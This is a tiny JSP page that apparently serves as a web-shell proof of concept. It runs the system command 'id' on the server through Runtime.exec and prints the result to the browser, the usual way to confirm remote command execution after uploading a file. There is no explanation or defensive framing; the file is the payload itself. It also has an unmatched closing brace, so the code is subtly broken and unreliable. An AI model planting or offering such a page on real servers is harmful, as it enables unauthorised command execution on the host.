<%@ page import="java.util.*,java.io.*"%>
<%
out.println("Command: " + "id" + "<BR>");
    Process p = Runtime.getRuntime().exec("id");
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
            out.println(disr); 
            disr = dis.readLine(); 
            }
        }
%>